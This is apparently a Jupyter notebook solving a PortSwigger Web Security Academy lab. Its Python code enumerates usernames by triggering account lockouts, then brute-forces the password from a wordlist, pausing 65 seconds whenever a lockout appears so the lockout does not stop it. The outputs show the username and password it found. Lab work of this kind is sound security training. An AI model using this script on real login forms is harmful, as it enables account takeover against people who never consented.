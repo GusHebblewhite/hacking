{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "dd64b626",
   "metadata": {},
   "source": [
    "# Password Based Logins - Username Enumeration: Account Lock"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d9d80295",
   "metadata": {},
   "source": [
    "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock\n",
    "\n",
    "We are looking for a different response if we enter a valid username a certain number of times than an invalid."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "ff869d43",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import re\n",
    "import tqdm.notebook as tq\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "12c04dd2",
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = \"https://acf21f471f962a85c0c1272c00df005d.web-security-academy.net/\"\n",
    "\n",
    "textfile_dir = \"../../../library/text_files/\"\n",
    "\n",
    "with open(textfile_dir + \"pw_list.txt\", 'r') as f:\n",
    "    passwords = [x.strip() for x in f.readlines()]\n",
    "\n",
    "with open(textfile_dir + \"uname_list.txt\", 'r') as f:\n",
    "    usernames = [x.strip() for x in f.readlines()]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "351e0510",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a01ace31f27d4c01a25559445ec92e14",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/101 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['You have made too many incorrect login attempts. Please try again in 1 minute(s).'] 3 adkit\n"
     ]
    }
   ],
   "source": [
    "#Username enumeration\n",
    "s = requests.session()\n",
    "r = s.get(URL + \"login\")\n",
    "\n",
    "found = 0\n",
    "\n",
    "for idx, each_username in enumerate(tq.tqdm(usernames)):\n",
    "    \n",
    "    data = {\"username\" : each_username, \"password\" : \"XXXXXXXXXXXXXXXX\"}\n",
    "    \n",
    "    for count in range(4):\n",
    "    \n",
    "        r = s.post(URL + \"login\", data=data)\n",
    "        message = re.findall(r\"<h1>Login</h1>[\\s\\S]*?<p.*?>(.*?)</p>\", r.text)\n",
    "        if message != ['Invalid username or password.']:\n",
    "            print(message, count, each_username)\n",
    "            found = 1\n",
    "            break\n",
    "            \n",
    "    if found == 1:\n",
    "        break\n",
    "        \n",
    "#Save the username\n",
    "valid_username = each_username"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aed264c3",
   "metadata": {},
   "source": [
    "Ok so we now have the username!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "05f5cad4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "94516da6f9e348019b7c2a6808f56f2e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/100 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "jennifer\n"
     ]
    }
   ],
   "source": [
    "results = []\n",
    "\n",
    "for idx, each_password in enumerate(tq.tqdm(passwords)):\n",
    "    \n",
    "    #Set up variable to check that each password has been fairly tested\n",
    "    processed = 0\n",
    "    \n",
    "    while(processed == 0):\n",
    "        \n",
    "        data = {\"username\" : valid_username, \"password\" : each_password}\n",
    "        r  = s.post(URL + \"login\", data=data)\n",
    "        message = re.findall(r\"<h1>Login</h1>[\\s\\S]*?<p.*?>(.*?)</p>\", r.text)\n",
    "\n",
    "        if message == ['You have made too many incorrect login attempts. Please try again in 1 minute(s).']:\n",
    "            time.sleep(65)\n",
    "        elif message == ['Invalid username or password.']:\n",
    "            processed = 1\n",
    "        else:\n",
    "            results.append(r.text)\n",
    "            print(each_password)\n",
    "            processed = 1\n",
    "            "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
